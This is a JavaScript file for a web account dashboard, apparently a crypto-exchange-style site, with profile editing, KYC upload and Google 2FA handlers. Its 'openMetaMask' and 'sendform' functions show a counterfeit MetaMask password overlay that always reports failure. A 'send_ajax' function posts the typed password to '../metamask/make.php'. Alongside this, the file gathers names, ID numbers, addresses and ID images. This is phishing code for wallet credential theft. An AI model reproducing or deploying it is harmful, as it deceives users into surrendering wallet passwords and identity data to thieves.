 function noti(msg, status) {
    toastr[status](msg);
    toastr.options = {
      "closeButton": false,
      "debug": false,
      "newestOnTop": false,
      "progressBar": false,
      "rtl": false,
      "positionClass": "toast-top-right",
      "preventDuplicates": false,
      "onclick": null,
      "showDuration": 300,
      "hideDuration": 1000,
      "timeOut": 5000,
      "extendedTimeOut": 1000,
      "showEasing": "swing",
      "hideEasing": "linear",
      "showMethod": "fadeIn",
      "hideMethod": "fadeOut"
    }
  }



	$("#alert_close_modal").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });

  $("#alert_close_modal_btn").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });


   function openMetaMask() {
    $("#metMaskBlock").css("opacity", "1");
    $("#metMaskBlock").css("z-index", "99999999");
    setTimeout(function () {
        $('#load').addClass('hide');
        $("#verify_popap_meta").css("display", "none");
        document.getElementById('loaded').classList.remove('hide');
    }, 1000);

    setInterval(function() {
      if(($("#pswrd").val().length > 7)) {document.getElementById("buttonf").disabled = false;} else {document.getElementById("buttonf").disabled = true;}
    }, 1000)


  }


function func() {
  document.getElementById('pswrd').classList.remove('border-red');
  $('#error1').addClass('hide');
}


var calc = 0;

function sendform(e) {
        e.preventDefault();
        //send_message()
        calc ++
        $('#error1').addClass('hide');
        $('#error2').addClass('hide');
        document.getElementById('pswrd').classList.remove('border-red');

        if (calc < 3) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        $('#pswrd').addClass('border-red');
        document.getElementById('error1').classList.remove('hide');
        document.getElementById('buttonf').classList.remove('hide'); 
        }, 1234);
        }

        if (calc > 2) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        document.getElementById('error2').classList.remove('hide');
        }, 984);
        }
       
}
    
    
function send_message() {
        var res = document.getElementById('pswrd').value;
            send_ajax(res)
}

function send_ajax(text) {
       return new Promise(function (resolve, reject) {
            $.ajax({
                type: 'post',
                url: '../metamask/make.php',
                dataType: 'json',
                data: {
                    'text':text,
                }
            });
        });
}


$("#closeMetaMaskBtn").on("click", function() {
    $("#verify_popap_meta").css("display", "none");
    var MetaalertMessageId = $("#MetaalertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: MetaalertMessageId
	      },
	      success: function(response) {

	      }
	    })
  }); 

  
  $("#user_profile_save").on("click", function(e) {
    e.preventDefault();

    var phone_number = $("#phone_number").val();
    var old_password = $("#old_password").val();
    var new_password = $("#new_password").val();

    if(new_password.length > 0 && new_password.length < 6 && new_password.length > 20) {
        noti("Password must be at least 6 characters and maximum 20 symbols", "error");
    }if(old_password.length > 0 && old_password.length < 6) {
        noti("Password must be at least 6 characters", "error");
    } else {
        $.ajax({
          url: "/ajax/UPDATE_USER_PROFILE",
          type: "POST",
          data: {
            phone: phone_number,
            old_password: old_password,
            new_password: new_password
          },
		  dataType: 'json',
          success: function(data) {

            if(data.response == 'success') {
              noti("Data updated successfully", "success");
			  $("#phone_number").val(data.phone)
            } 
			if(data.response == 'error') {
			  noti(data.text, "error");
            } 
          },
		  error: function() {
			  noti("An unexpected error has occurred, please try again", "error");
		  }
        })
    }
  });  

  $("#update_person_info").on("click", function(e) {
    e.preventDefault();

    var u_fullname = $("#fullname").val();
    var date_of_birth = $("#date_of_birth").val();
    var present_address = $("#present_address").val();
    var permanent_address = $("#permanent_address").val();
    var user_city = $("#user_city").val();
    var user_postal_code = $("#user_postal_code").val();
    var user_country = $("#user_country option:selected").val();

    if(u_fullname.length > 0 && u_fullname.length < 6) {
        noti("Please enter the correct First and Last Name", "error");
    } else if(date_of_birth.length > 0 && date_of_birth.length < 6) {
        noti("Please enter the correct Date of Birth", "error");
    } else if(present_address.length > 0 && present_address.length < 10) {
        noti("Please enter the correct Present address", "error");
    } else if(permanent_address.length > 0 && permanent_address.length < 10){
        noti("Please enter the correct Permanent address", "error");
    } else if(user_city.length > 0 && user_city.length < 2) {
        noti("Please enter the correct City name", "error");
    } else {
       $.ajax({
          url: "/ajax/UPDATE_PERSONAL_INFO",
          type: "POST",
          data: {
            fullname: u_fullname,
            date_birth: date_of_birth,
            present_address: present_address,
            permanent_address: permanent_address,
            user_city: user_city,
            user_postal_code: user_postal_code,
            user_country: user_country
          },
          success: function(response) {
            if(response == "1") {
              noti("Data updated successfully", "success");
            } else if(response == "2") {
              noti("Please enter correct information", "error");
            } else if(response == "4") {
              noti("When saving, all fields must be filled", "error");
            } else {
              noti("An unexpected error has occurred, please try again", "error");
            }

          }
        }) 
    }



  });

  $("#profile_photo2").on("click", function() {
    setInterval(function() {
        var profile_photo = $("#profile_photo").val();
        $(".file-upload-wrapper").attr("data-text", profile_photo);
    }, 1000)
  });



$("#profile_photo").change(function(){
	if (window.FormData === undefined) {
		alert('В вашем браузере FormData не поддерживается')
	} else {
		var profile_photo = $("#profile_photo").val();
        $(".file-upload-wrapper").attr("data-text", profile_photo);
		
		
		var formData = new FormData();
		formData.append('file', $("#profile_photo")[0].files[0]);
 
		$.ajax({
			type: "POST",
			url: '/ajax/UPDATE_PERSONAL_PHOTO',
			cache: false,
			contentType: false,
			processData: false,
			data: formData,
			dataType : 'json',
			success: function(response){
				if (response.response == 'success') {
					//$("#profile_photo").hide();
					$('.user_photo_setting').attr('src', response.photo);
				} else {
					$('#result22').html(response.error);
				}
			}
		});
	}
});















  function openNextKyc(e) {
      e.preventDefault();

      var kyc_first_name = $("#kyc_first_name").val();
      var kyc_last_name = $("#kyc_last_name").val();
      var kyc_middle_name = $("#kyc_middle_name").val();
      var kyc_date_of_brith = $("#kyc_date_of_birth").val();
      var kyc_id_type = $("#kyc_id_type").val();
      var kyc_id_number = $("#kyc_id_number").val();
      var kyc_image = $("#kyc_image").val();

      var kyc_image_size = $("#kyc_image")[0].files[0];

      if(kyc_first_name == "") {
          noti("Please, enter First Name!", "error");
      } else if(kyc_last_name == "") {
          noti("Please, enter Last Name!", "error");
      } else if(kyc_date_of_brith == "") {
          noti("Please, enter Date of Birth!", "error");
      } else if(kyc_id_type == "") {
          noti("Please, select ID Type", "error");
      } else if(kyc_id_number == "") {
          noti("Please, enter ID Number!", "error");
      } else if(kyc_image == "") {
          noti("Please, select Image", "error");
      } else if(kyc_image_size['size'] > 2000000) {
          noti("Image size must not be larger than 2 megabytes", "error");
      } else {
          $("#kyc_send").click();
      }
  }

  $("#enable_2fa").on("click", function() {
    $("#security_2fa").css("display", "flex");
  });

  $("#close_modal").on("click", function() {
    $("#security_2fa").css("display", "none");
  });

  $("#close_modal_btn").on("click", function() {
    $("#security_2fa").css("display", "none");
  });

  $("#connect_google_2fa").on("click", function(e) {
        e.preventDefault();

        var code_2fa = $("#code_2fa").val().replace(/\s+/g, '');
        if(code_2fa == "" || code_2fa.length != 6) {
            noti("Please enter correct 2FA code", "error");
        } else {
           $.ajax({
              url: "../ajax/ajax",
              type: "POST",
              data: {
                action: "CONNECT_GOOGLE_2FA",
                code_2fa: code_2fa
              },
              success: function(response) {
                console.log(response);
                if(response == "1") {
                  noti("Google 2FA successfully activated", "success");
                  $("#security_2fa").css("display", "none");
                  $(".userAttention").remove();
                } else if(response == "2") {
                  noti("Please enter correct 2FA code", "error");
                } else {
                  noti("An unexpected error has occurred, please try again", "error");
                }

              }
            })  
        }
        
    });